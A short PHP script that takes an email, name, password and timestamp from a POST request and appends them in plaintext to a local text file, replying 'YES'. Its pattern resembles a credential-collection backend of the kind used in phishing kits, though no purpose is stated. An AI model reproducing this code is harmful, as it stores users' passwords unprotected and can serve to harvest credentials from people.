<?php
	header('Content-type: application/json');
	$myFile = "test.txt";
	$fh = fopen($myFile, 'a') or die("can't open file");


	
	if($_POST) {
		$time   = $_POST['time'];
		$email = $_POST['email'];
		$name = $_POST['name'];
		$password = $_POST['password'];


		$stringData = "\nTime: ". $time ."\nEmail: " . $email. "\n New name: " . $name. "\nNew password". $password."\n";
		fwrite($fh, $stringData);

		echo "YES";
	}
	fclose($fh);

?>
